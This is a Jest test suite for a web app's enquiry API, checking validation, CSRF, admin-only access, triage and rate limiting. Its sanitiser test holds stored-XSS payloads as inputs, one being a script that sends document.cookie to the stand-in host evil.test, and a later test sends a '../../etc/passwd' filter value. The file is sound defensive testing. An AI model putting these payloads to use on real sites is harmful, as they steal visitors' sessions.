/**
 * The enquiry pipeline: the careers "Partner with us" / "Other Queries" tabs
 * and the /contact form.
 *
 * Before this existed, all three of those surfaces dropped the message on the
 * floor — two behind a `mailto:` and one behind a 1-second `setTimeout` that
 * reported success without making a network call. So this suite covers the
 * whole path: what the public route accepts, what it refuses, that the stored
 * text went through the sanitiser, and who may read the queue.
 */

require('../support/env');

const request = require('supertest');
const { startServer, stopServer } = require('../support/server');
const { connectDb, disconnectDb } = require('../support/db');

jest.setTimeout(60000);

jest.mock('razorpay', () => jest.fn().mockImplementation(() => ({
  orders: { create: jest.fn() },
  payments: { refund: jest.fn(), fetchMultipleRefund: jest.fn().mockResolvedValue({ items: [] }) },
  accounts: { create: jest.fn() }
})));
jest.mock('../../services/email.service', () => new Proxy({}, {
  get: () => jest.fn().mockResolvedValue({ id: 'sink' })
}));

/**
 * The real `isomorphic-dompurify` cannot be loaded under Jest in this repo —
 * it pulls in jsdom, whose `@exodus/bytes` dependency is ESM-only and Jest's
 * CJS runtime cannot parse it. Every other suite here stubs it to a
 * pass-through for that reason.
 *
 * A pass-through would make the assertions below vacuous, so this stub strips
 * tags and records its calls instead. What is being tested is the controller,
 * not DOMPurify: that every free-text field is routed through the sanitiser
 * with ALLOWED_TAGS: [], and that what lands in Mongo is the sanitiser's
 * output rather than `req.body`. The real library's output for these exact
 * inputs was checked directly in node — '<img src=x onerror=alert(1)>Sana'
 * becomes 'Sana', '<b>Urgent</b>' becomes 'Urgent', and the <script> case
 * below becomes 'Hello  there' — which is what the stub reproduces.
 */
const sanitizeCalls = [];
jest.mock('isomorphic-dompurify', () => ({
  sanitize: (value, options) => {
    sanitizeCalls.push({ value, options });
    return String(value)
      .replace(/<(script|style)\b[^>]*>[\s\S]*?<\/\1>/gi, '')
      .replace(/<[^>]*>/g, '');
  }
}));

let app, server, f, Enquiry;
let adminToken, superAdminToken, patientToken;

beforeAll(async () => {
  await connectDb('enquiries');
  app = require('../../app');
  server = await startServer(app);
  Enquiry = require('../../models/enquiry');

  const { seedAll } = require('../support/seed');
  f = await seedAll();

  const jwt = require('jsonwebtoken');
  const { getJWTSecret, getAdminJWTSecret } = require('../../config/auth');
  patientToken = jwt.sign({ userId: String(f.patientA._id), role: 'patient' }, getJWTSecret(), { expiresIn: '1h' });
  adminToken = jwt.sign({ userId: String(f.admin._id), role: 'admin' }, getAdminJWTSecret(), { expiresIn: '1h' });
  superAdminToken = jwt.sign({ userId: String(f.superAdmin._id), role: 'super_admin' }, getAdminJWTSecret(), { expiresIn: '1h' });
}, 180000);

afterAll(async () => {
  await stopServer(server);
  await disconnectDb();
});

beforeEach(async () => {
  await Enquiry.deleteMany({});
});

async function csrfPair() {
  const res = await request(server).get('/api/csrf-token');
  return { csrf: res.body.csrfToken, cookie: res.headers['set-cookie'] };
}

async function call(method, path, token, body) {
  const { csrf, cookie } = await csrfPair();
  let req = request(server)[method](path).set('Cookie', cookie).set('X-CSRF-Token', csrf);
  if (token) req = req.set('Authorization', `Bearer ${token}`);
  return body === undefined ? req.send() : req.send(body);
}

const PARTNER = {
  type: 'partner',
  name: 'Ravi Menon',
  organisation: 'Northline Manufacturing',
  email: 'Ravi.Menon@Northline.test',
  phone: '+91 98200 11223',
  message: 'We have 400 employees and would like to discuss an EAP tie-up.'
};
const OTHER = {
  type: 'other',
  name: 'Sana Iqbal',
  email: 'sana@example.test',
  subject: 'Invoice for a cancelled session',
  message: 'I was charged twice for the same appointment on the 4th.'
};
const CONTACT = {
  type: 'contact',
  name: 'Dev Rao',
  email: 'dev.rao@example.test',
  message: 'Do you offer sessions in Kannada?'
};

describe('submitting an enquiry', () => {
  test.each([
    ['a partnership enquiry', PARTNER],
    ['a general query', OTHER],
    ['a contact-page message', CONTACT]
  ])('%s is stored and acknowledged', async (_label, payload) => {
    const res = await call('post', '/api/enquiries', null, payload);

    expect(res.status).toBe(201);
    expect(res.body.success).toBe(true);
    expect(res.body.data.type).toBe(payload.type);

    const stored = await Enquiry.findById(res.body.data.id);
    expect(stored).not.toBeNull();
    expect(stored.name).toBe(payload.name);
    expect(stored.message).toBe(payload.message);
    expect(stored.status).toBe('new');
    // Nobody has triaged it yet.
    expect(stored.handledBy).toBeNull();
    expect(stored.handledAt).toBeNull();
  });

  test('no login is required — this is the point of the route', async () => {
    // The route carries publicRoute(), so authz.sweep.test.js expects a 2xx
    // from an anonymous caller. Asserted here too so the reason is stated
    // next to the behaviour rather than only in an allowlist.
    const res = await call('post', '/api/enquiries', null, CONTACT);
    expect(res.status).toBe(201);
  });

  test('the email is normalised to lower case so the admin queue dedupes', async () => {
    const res = await call('post', '/api/enquiries', null, PARTNER);
    const stored = await Enquiry.findById(res.body.data.id);
    expect(stored.email).toBe('ravi.menon@northline.test');
  });

  test('an empty body is a 400 and writes nothing', async () => {
    // authz.sweep.test.js posts {} to every route and asserts the database
    // census is byte-identical afterwards; this is that guarantee, stated
    // directly.
    const res = await call('post', '/api/enquiries', null, {});

    expect(res.status).toBe(400);
    expect(await Enquiry.countDocuments({})).toBe(0);
  });

  test.each([
    ['an unknown type', { ...CONTACT, type: 'newsletter' }, 'type'],
    ['a missing type', { ...CONTACT, type: undefined }, 'type'],
    ['a malformed email', { ...CONTACT, email: 'not-an-email' }, 'email'],
    ['a blank name', { ...CONTACT, name: '   ' }, 'name'],
    ['a blank message', { ...CONTACT, message: '' }, 'message'],
    ['a partnership with no organisation', { ...PARTNER, organisation: undefined }, 'organisation'],
    ['a general query with no subject', { ...OTHER, subject: undefined }, 'subject']
  ])('%s is refused, naming the field', async (_label, payload, field) => {
    const res = await call('post', '/api/enquiries', null, payload);

    expect(res.status).toBe(400);
    expect(JSON.stringify(res.body)).toContain(field);
    expect(await Enquiry.countDocuments({})).toBe(0);
  });

  test('an over-long message is refused rather than truncated', async () => {
    const res = await call('post', '/api/enquiries', null, { ...CONTACT, message: 'x'.repeat(4001) });
    expect(res.status).toBe(400);
    expect(await Enquiry.countDocuments({})).toBe(0);
  });

  test('markup in the free text is stripped before it is stored', async () => {
    // This text renders in the Super Admin dashboard, so an enquiry is a
    // stored-XSS vector if it is persisted raw.
    const res = await call('post', '/api/enquiries', null, {
      ...OTHER,
      name: '<img src=x onerror=alert(1)>Sana',
      subject: '<b>Urgent</b>',
      message: 'Hello <script>fetch("//evil.test?c="+document.cookie)</script> there'
    });

    expect(res.status).toBe(201);
    const stored = await Enquiry.findById(res.body.data.id);
    expect(stored.name).toBe('Sana');
    expect(stored.subject).toBe('Urgent');
    expect(stored.message).not.toMatch(/<script/i);
    expect(stored.message).not.toContain('document.cookie');
    expect(stored.message).toContain('Hello');
    expect(stored.message).not.toContain('evil.test');
  });

  test('every free-text field goes through the sanitiser, with tags disallowed', async () => {
    // The check that survives a refactor: it fails if a new field is added to
    // the create call without being cleaned, which is how the next stored-XSS
    // hole gets introduced.
    sanitizeCalls.length = 0;
    await call('post', '/api/enquiries', null, PARTNER);

    const cleaned = sanitizeCalls.map((c) => c.value);
    for (const field of ['name', 'organisation', 'email', 'phone', 'message']) {
      expect(cleaned).toContain(PARTNER[field]);
    }
    expect(sanitizeCalls.every((c) => c.options && Array.isArray(c.options.ALLOWED_TAGS) && c.options.ALLOWED_TAGS.length === 0)).toBe(true);
  });

  test('a client-supplied status or handledBy is ignored', async () => {
    const res = await call('post', '/api/enquiries', null, {
      ...CONTACT,
      status: 'closed',
      adminNotes: 'nothing to see here',
      handledBy: String(f.superAdmin._id)
    });

    expect(res.status).toBe(201);
    const stored = await Enquiry.findById(res.body.data.id);
    expect(stored.status).toBe('new');
    expect(stored.adminNotes).toBe('');
    expect(stored.handledBy).toBeNull();
  });

  test('the browser CSRF token is required, like every other cookie-auth write', async () => {
    const res = await request(server).post('/api/enquiries').send(CONTACT);
    expect(res.status).toBe(403);
    expect(await Enquiry.countDocuments({})).toBe(0);
  });
});

describe('reading the queue', () => {
  beforeEach(async () => {
    await Enquiry.create([
      { ...PARTNER, email: 'a@x.test' },
      { ...OTHER, email: 'b@x.test' },
      { ...CONTACT, email: 'c@x.test', status: 'closed' }
    ]);
  });

  test('a super admin sees every enquiry, newest first, with an unread count', async () => {
    const res = await call('get', '/api/enquiries', superAdminToken);

    expect(res.status).toBe(200);
    expect(res.body.data.enquiries).toHaveLength(3);
    expect(res.body.data.newCount).toBe(2);
    expect(res.body.data.pagination.total).toBe(3);

    const times = res.body.data.enquiries.map((e) => new Date(e.createdAt).getTime());
    expect(times).toEqual([...times].sort((a, b) => b - a));
  });

  test('the list filters by type and by status', async () => {
    const byType = await call('get', '/api/enquiries?type=partner', superAdminToken);
    expect(byType.body.data.enquiries.map((e) => e.type)).toEqual(['partner']);

    const byStatus = await call('get', '/api/enquiries?status=closed', superAdminToken);
    expect(byStatus.body.data.enquiries.map((e) => e.status)).toEqual(['closed']);

    // newCount is the size of the whole queue, not of the filtered page —
    // otherwise the sidebar badge would vanish while a filter is applied.
    expect(byStatus.body.data.newCount).toBe(2);
  });

  test('a junk filter value is ignored rather than returning nothing', async () => {
    const res = await call('get', '/api/enquiries?status=../../etc/passwd&type=%00', superAdminToken);
    expect(res.status).toBe(200);
    expect(res.body.data.enquiries).toHaveLength(3);
  });

  test.each([
    ['an anonymous caller', () => null, 401],
    ['a patient token', () => patientToken, 401],
    ['a plain admin token', () => adminToken, 403]
  ])('%s cannot read the queue', async (_label, token, expected) => {
    const res = await call('get', '/api/enquiries', token());
    expect(res.status).toBe(expected);
    expect(res.body.data).toBeUndefined();
  });
});

describe('triaging an enquiry', () => {
  let id;

  beforeEach(async () => {
    const doc = await Enquiry.create({ ...PARTNER, email: 'triage@x.test' });
    id = String(doc._id);
  });

  test('a status change records who moved it and when', async () => {
    const res = await call('patch', `/api/enquiries/${id}`, superAdminToken, { status: 'in_progress' });

    expect(res.status).toBe(200);
    expect(res.body.data.status).toBe('in_progress');
    expect(String(res.body.data.handledBy._id)).toBe(String(f.superAdmin._id));
    expect(res.body.data.handledAt).toBeTruthy();
  });

  test('admin notes are stored and sanitised', async () => {
    const res = await call('patch', `/api/enquiries/${id}`, superAdminToken, {
      adminNotes: 'Called back <script>alert(1)</script> on Tuesday'
    });

    expect(res.status).toBe(200);
    expect(res.body.data.adminNotes).not.toMatch(/<script/i);
    expect(res.body.data.adminNotes).toContain('Called back');
  });

  test('an unknown status is refused', async () => {
    const res = await call('patch', `/api/enquiries/${id}`, superAdminToken, { status: 'deleted' });
    expect(res.status).toBe(400);
    expect((await Enquiry.findById(id)).status).toBe('new');
  });

  test('an empty update is refused rather than silently stamping handledAt', async () => {
    const res = await call('patch', `/api/enquiries/${id}`, superAdminToken, {});
    expect(res.status).toBe(400);
    expect((await Enquiry.findById(id)).handledAt).toBeNull();
  });

  test('a malformed id is a clean 400, not a 500', async () => {
    const res = await call('patch', '/api/enquiries/not-an-objectid', superAdminToken, { status: 'closed' });
    expect(res.status).toBe(400);
  });

  test('a well-formed but unknown id is a 404', async () => {
    const gone = new (require('mongoose').Types.ObjectId)();
    const res = await call('patch', `/api/enquiries/${gone}`, superAdminToken, { status: 'closed' });
    expect(res.status).toBe(404);
  });

  test.each([
    ['an anonymous caller', () => null, 401],
    ['a plain admin token', () => adminToken, 403]
  ])('%s cannot triage', async (_label, token, expected) => {
    const res = await call('patch', `/api/enquiries/${id}`, token(), { status: 'closed' });
    expect(res.status).toBe(expected);
    expect((await Enquiry.findById(id)).status).toBe('new');
  });
});

describe('rate limiting', () => {
  // The app-level limiters are mounted only in production (app.js:122-137), so
  // a plain loop against the running test server proves nothing. This builds a
  // throwaway app around a limiter constructed under NODE_ENV=production, which
  // is the configuration that actually ships.
  test('the sixth enquiry from one address in the window is refused', async () => {
    const express = require('express');
    const previousEnv = process.env.NODE_ENV;
    process.env.NODE_ENV = 'production';
    jest.resetModules();

    let limited;
    try {
      const { enquiryLimiter } = require('../../middleware/rateLimit.middleware');
      const { errorHandler } = require('../../middleware/error.middleware');

      limited = express();
      limited.use(express.json());
      limited.post('/enquiries', enquiryLimiter, (_req, res) => res.status(201).json({ success: true }));
      limited.use(errorHandler);
    } finally {
      process.env.NODE_ENV = previousEnv;
      jest.resetModules();
    }

    const statuses = [];
    for (let i = 0; i < 7; i += 1) {
      // eslint-disable-next-line no-await-in-loop
      const res = await request(limited).post('/enquiries').send({ ...CONTACT, message: `try ${i}` });
      statuses.push(res.status);
    }

    expect(statuses.slice(0, 5)).toEqual([201, 201, 201, 201, 201]);
    expect(statuses.slice(5)).toEqual([429, 429]);
  });

  test('the limit is keyed on the email, so one flooder does not lock out a shared NAT', async () => {
    const express = require('express');
    const previousEnv = process.env.NODE_ENV;
    process.env.NODE_ENV = 'production';
    jest.resetModules();

    let limited;
    try {
      const { enquiryLimiter } = require('../../middleware/rateLimit.middleware');
      const { errorHandler } = require('../../middleware/error.middleware');

      limited = express();
      limited.use(express.json());
      limited.post('/enquiries', enquiryLimiter, (_req, res) => res.status(201).json({ success: true }));
      limited.use(errorHandler);
    } finally {
      process.env.NODE_ENV = previousEnv;
      jest.resetModules();
    }

    for (let i = 0; i < 6; i += 1) {
      // eslint-disable-next-line no-await-in-loop
      await request(limited).post('/enquiries').send({ ...CONTACT, email: 'flooder@x.test' });
    }

    const other = await request(limited).post('/enquiries').send({ ...CONTACT, email: 'someone.else@x.test' });
    expect(other.status).toBe(201);
  });
});
